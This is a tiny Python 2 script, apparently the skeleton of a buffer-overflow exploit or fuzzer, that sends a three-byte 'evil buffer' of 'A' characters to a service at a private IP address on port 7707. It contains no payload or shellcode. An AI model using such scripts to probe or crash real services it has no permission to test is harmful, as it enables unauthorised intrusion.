import socket
import sys

buf = 'A'*3

try:
	sc = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
	sc.connect(("192.168.1.109", 7707))
	sc.send(buf)
	print "[+] Evil buffer sent"
	sc.close()

except:
	print "[-] Can't send evil buffer"
	sys.exit()
